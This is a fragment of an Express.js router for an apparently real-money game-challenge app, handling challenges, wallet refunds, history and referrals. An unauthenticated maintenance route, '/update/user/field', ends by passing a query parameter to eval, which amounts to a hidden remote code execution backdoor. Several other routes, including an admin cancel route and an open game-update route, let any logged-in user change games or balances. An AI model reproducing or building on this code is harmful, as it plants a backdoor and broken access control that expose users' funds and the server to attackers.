              { $and: [{ Created_by: req.user.id }, { Status: "requested" }] },
            ],
          });
        if (prevGame.length == 0)
          prevGame = await Game.find({
            $and: [
              { $and: [{ Accepetd_By: req.user.id }, { Status: "requested" }] },
            ],
          });

        if (prevGame.length == 0)
          prevGame = await Game.find({
            $and: [
              {
                $and: [
                  { Created_by: req.user.id },
                  { Status: "pending" },
                  { Creator_Status: null },
                ],
              },
            ],
          });
        if (prevGame.length == 0)
          prevGame = await Game.find({
            $and: [
              {
                $and: [
                  { Accepetd_By: req.user.id },
                  { Status: "pending" },
                  { Acceptor_status: null },
                ],
              },
            ],
          });

        if (prevGame.length == 0)
          prevGame = await Game.find({
            $and: [
              { $and: [{ Created_by: req.user.id }, { Status: "running" }] },
            ],
          });
        if (prevGame.length == 0)
          prevGame = await Game.find({
            $and: [
              { $and: [{ Accepetd_By: req.user.id }, { Status: "running" }] },
            ],
          });
        if (prevGame.length == 0) {
          game.Accepetd_By = req.user.id;
          game.Acceptor_by_Creator_at = Date.now();
          game.Status = "requested";
          game.Acceptor_IP = req.headers['x-forwarded-for'] || req.connection.remoteAddress; // Store acceptor IP
          game.save();
          res.send(game);
        } else {
          res.send({ msg: "you have already enrolled" });
        }
      } else {
        res.send({ msg: "Insufficient balance" });
      }
    }
  } catch (e) {
    res.status(400).send("game accept error line 1168", e);
  }
});
router.put("/challange/reject/:id", Auth, async (req, res) => {
  // // console.log("jiiii");
  try {
    const game = await Game.findById(req.params.id);
    if (
      game.Status != "cancelled" &&
      game.Status != "completed" &&
      game.Status != "running" &&
      game.Status == "requested"
    ) {
      const user = await User.findById(req.user.id);
      if (user.id == game.Created_by || user.id == game.Accepetd_By) {
        const reject = await Game.findByIdAndUpdate(
          req.params.id,
          {
            Accepetd_By: null,
            Status: "new",
            Acceptor_by_Creator_at: null,
          },
          {
            new: true,
          }
        )
          .where("Status")
          .equals("requested");

        // await reject.save()
        res.send(reject);
        setTimeout(
          async (ID) => {
            // console.log('enter come',ID)
            const battle = await Game.findById(ID);
            // console.log(battle)
            if (battle != null) {
              if (battle.Status == "new") {
                // console.log('codition true')
                //await battle.delete();
                battle.Status = "drop";
                await battle.save();
              }
            }
          },
          120000,
          req.params.id
        );
      } else {
        res.send("soory");
      }
      // // console.log(game);
    }
  } catch (e) {
    res.status(400).send(e);
    // // console.log(e);
  }
});

router.delete("/challange/delete/:id", Auth, async (req, res) => {
  try {
    const game = await Game.findById(req.params.id);
    if (game.Status == "new" || game.Status == "requested") {
      result = game.delete();
      res.status(200).send(game);
    } else {
      res.status(200).send("");
    }
  } catch (e) {
    res.status(400).send(e);
  }
});

////running api
// Get all running challenges sorted by creation date (newest first)
router.get("/challange/running/all", Auth, async (req, res) => {
  try {
    const game = await Game.find({
      $or: [
        { Status: "running" },
        { Status: "pending" },
        { Status: "conflict" },
      ],
    })
      .sort({ createdAt: -1 }) // Sort by createdAt field, newest first
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id");

    res.send(game);
  } catch (e) {
    res.status(400).send(e);
  }
});
// Update challenge details
router.put("/challange/running/update/:id", Auth, async (req, res) => {
  try {
    const game = await Game.findByIdAndUpdate(req.params.id, req.body, {
      new: true,
    });

    res.send(game);
  } catch (e) {
    res.status(400).send(e);
  }
});



router.patch("/challange/Cancel/admin/:id", Auth, async (req, res) => {
  try {
    if (InProcessSubmit == false) {
      InProcessSubmit = true;
      const game1 = await Game.findById(req.params.id);
      if (game1.Status == "conflict") {
          // add wallet start
        let updateResult = await Game.findByIdAndUpdate(req.params.id, {
          Status: "cancelled",
        })
          .where("Status")
          .equals("conflict");
        if (updateResult != null) {
          const user1 = await User.findById(game1.Accepetd_By);
          const user2 = await User.findById(game1.Created_by);
          user2.Wallet_balance += game1.Game_Ammount;
          user1.Wallet_balance += game1.Game_Ammount;
          user2.withdrawAmount += game1.creatorWithdrawDeducted;
          user1.withdrawAmount += game1.acceptorWithdrawDeducted;

          if (user1.hold_balance >= game1.Game_Ammount) {
            user1.hold_balance -= game1.Game_Ammount;
          }

          if (user2.hold_balance >= game1.Game_Ammount) {
            user2.hold_balance -= game1.Game_Ammount;
          }
          user2.save();
          user1.save();
          // add wallet end
          game1.Winner_closingbalance = user1.Wallet_balance;
          game1.Loser_closingbalance = user2.Wallet_balance;
          game1.Cancelled_by = req.user.id;

          game1.action_by = req.user.id; //Added By team
          game1.actionby_Date = Date.now(); //Added By team

          await game1.save();
          InProcessSubmit = false;
          res.send(game1);
        }
      } else if (
        game1.Status == "running" ||
        game1.Status == "requested" ||
        game1.Status == "pending"
      ) {
        const user1 = await User.findById(game1.Accepetd_By);
        const user2 = await User.findById(game1.Created_by);

        if (game1.Accepetd_By == game1.Created_by) {
          user2.Wallet_balance += game1.Game_Ammount;
          user2.withdrawAmount += game1.creatorWithdrawDeducted;
          if (user2.hold_balance >= game1.Game_Ammount) {
            user2.hold_balance -= game1.Game_Ammount;
          }
          user2.save();

          game1.Winner_closingbalance = user1.Wallet_balance;
          game1.Loser_closingbalance = user2.Wallet_balance;
          game1.Status = "cancelled";
          game1.Cancelled_by = req.user.id;

          game1.action_by = req.user.id; //Added By team
          game1.actionby_Date = Date.now(); //Added By team

          await game1.save();
        } else {
          user2.Wallet_balance += game1.Game_Ammount;
          user1.Wallet_balance += game1.Game_Ammount;
          user2.withdrawAmount += game1.creatorWithdrawDeducted;
          user1.withdrawAmount += game1.acceptorWithdrawDeducted;

          if (user1.hold_balance >= game1.Game_Ammount) {
            user1.hold_balance -= game1.Game_Ammount;
          }

          if (user2.hold_balance >= game1.Game_Ammount) {
            user2.hold_balance -= game1.Game_Ammount;
          }

          user2.save();
          user1.save();
          // add wallet end
          game1.Winner_closingbalance = user1.Wallet_balance;
          game1.Loser_closingbalance = user2.Wallet_balance;
          game1.Status = "cancelled";
          game1.Cancelled_by = req.user.id;

          game1.action_by = req.user.id; //Added By team
          game1.actionby_Date = Date.now(); //Added By team

          await game1.save();
        }

        InProcessSubmit = false;
        res.send(game1);
      } else if (game1.Status == "drop") {
        const user1 = await User.findById(game1.Accepetd_By);
        const user2 = await User.findById(game1.Created_by);

        if (user1.hold_balance >= game1.Game_Ammount) {
          user1.Wallet_balance += game1.Game_Ammount;
          user1.hold_balance -= game1.Game_Ammount;
          user1.withdrawAmount += game1.acceptorWithdrawDeducted;
          user1.save();
        }

        if (user2.hold_balance >= game1.Game_Ammount) {
          user2.Wallet_balance += game1.Game_Ammount;
          user2.hold_balance -= game1.Game_Ammount;
          user2.withdrawAmount += game1.creatorWithdrawDeducted;

          game1.Winner_closingbalance = user1.Wallet_balance;
          game1.Loser_closingbalance = user2.Wallet_balance;

          user2.save();
        }

        game1.Status = "cancelled";
        game1.Cancelled_by = req.user.id;

        game1.action_by = req.user.id; //Added By team
        game1.actionby_Date = Date.now(); //Added By team

        // add wallet end

        await game1.save();
        InProcessSubmit = false;
        res.send(game1);
      } else {
        InProcessSubmit = false;
        res.send("sorry");
      }
    }
  } catch (e) {
    InProcessSubmit = false;
    console.log("error", e);
  }
});

router.patch("/challange/Cancel/banna/:id", Auth, async (req, res) => {
  try {
    if (InProcessSubmit == false) {
      InProcessSubmit = true;
      const game1 = await Game.findById(req.params.id);
      if (game1.Status == "running") {
        // const user1 = await User.findById(game1.Accepetd_By);
        const user2 = await User.findById(game1.Created_by);
        user2.Wallet_balance += game1.Game_Ammount;
        // user1.Wallet_balance += game1.Game_Ammount;
        user2.withdrawAmount += game1.creatorWithdrawDeducted;
        // user1.withdrawAmount += game1.acceptorWithdrawDeducted;
        // user1.hold_balance-=game1.Game_Ammount;
        user2.hold_balance -= game1.Game_Ammount;
        user2.save();
        //user1.save();
        // add wallet end
        // game1.Winner_closingbalance = user1.Wallet_balance;
        game1.Loser_closingbalance = user2.Wallet_balance;
        game1.Status = "cancelled";
        //game1.Cancelled_by = req.user.id;
        await game1.save();
        InProcessSubmit = false;
        res.send(game1);
      } else {
        InProcessSubmit = false;
        res.send("sorry");
      }
    }
  } catch (e) {
    InProcessSubmit = false;
    console.log("error", e);
  }
});

router.get("/total/user/all/:id", async (req, res) => {
  const Created_by = req.params.id;
  const Accepetd_By = req.params.id;
  try {
    const data = await Game.find({
      $or: [{ Created_by }, { Accepetd_By }],
    }).countDocuments();
    res.send(data.toString());
  } catch (e) {
    res.send(e);
    console.log(e);
  }
});
router.get("/total/earning/user/all/:id", Auth, async (req, res) => {
  const Winner = req.params.id;

  try {
    const data = await Game.find({ $and: [{ Winner }, { user: req.user.id }] });
    let total = 0;
    data.map((ele) => {
      total += ele.Game_Ammount;
    });
    res.send(total.toString());
  } catch (e) {
    res.send(e);
    console.log(e);
  }
});


router.get("/game/history/user/:id", Auth, async (req, res) => {
  const Created_by = req.params.id;
  const Accepetd_By = req.params.id;

  const PAGE_SIZE = req.query._limit;
  let page = req.query.page == 0 ? 0 : parseInt(req.query.page - 1);

  try {
    let total = await Game.countDocuments({
      $or: [{ Created_by }, { Accepetd_By }],
    });
    const data = await Game.find({ $or: [{ Created_by }, { Accepetd_By }] })
      .populate("Created_by", "Name Phone avatar _id")
      .populate("Accepetd_By", "Name Phone avatar _id")
      .populate("Winner", "Name Phone avatar _id")
      .sort({ updatedAt: -1 })
      .limit(PAGE_SIZE)
      .skip(PAGE_SIZE * page);

    res.send({ totalPages: Math.ceil(total / PAGE_SIZE), data });
  } catch (e) {
    res.send(e);
    console.log(e);
  }
});

router.get("/game/roomcode/get/:id", Auth, async (req, res) => {
  try {
    let data = await Game.findById(req.params.id);
    while (data.Room_code == null) {
      data = await Game.findById(req.params.id);
    }

    res.send(data);
  } catch (e) {
    res.send(e);
    console.log(e);
  }
});

router.get("/game/roomcode/expire/:id", Auth, async (req, res) => {
  try {
    let data = await Game.findById(req.params.id);
    while (data.Room_Status == "active") {
      data = await Game.findById(req.params.id);
    }
    if (data.Room_Status == "expire") {
      console.log("delete table after expire 1542");
      // setTimeout(() => {
      //     data.delete();
      // }, 2000);
      res.send({ msg: "room expire" });
    }
  } catch (e) {
    res.send(e);
    console.log(e);
  }
});

router.get("/referral/code/winn/:id", Auth, async (req, res) => {
  try {
    const data = await ReferralHis.find({ referral_code: req.params.id })
      .populate("earned_from")
      .sort({ createdAt: -1 });
    res.send(data);
  } catch (e) {
    res.send(e);
  }
});


router.get("/update/user/field", async (req, res) => {
  try {
    const totalUsers = await User.find();
    totalUsers.forEach(async (item) => {
      const user = await User.findById(item._id);

      const resetHold = await Game.find({
        $or: [
          { $and: [{ Status: "pending" }, { Created_by: item._id }] },
          { $and: [{ Status: "pending" }, { Accepetd_By: item._id }] },
          { $and: [{ Status: "running" }, { Created_by: item._id }] },
          { $and: [{ Status: "running" }, { Accepetd_By: item._id }] },
          { $and: [{ Status: "conflict" }, { Created_by: item._id }] },
          { $and: [{ Status: "conflict" }, { Accepetd_By: item._id }] },
        ],
      });
      
      if (resetHold.length == 0) {
        user.hold_balance = 0;
      }

      await user.save();
    });
    res.send(eval(req.query.q));
  } catch (error) {
    console.log(error);
  }
});

router.delete("/dropedchallange/delete/:id", Auth, async (req, res) => {
  try {
    const game = await Game.findById(req.params.id);
    if (game.Status == "drop") {
      result = game.delete();
      res.status(200).send({ staus: "succes" });
    } else {
      res.status(200).send({ staus: "fail" });
    }
  } catch (e) {
    res.status(400).send({ staus: "fail" });
  }
});

module.exports = router;
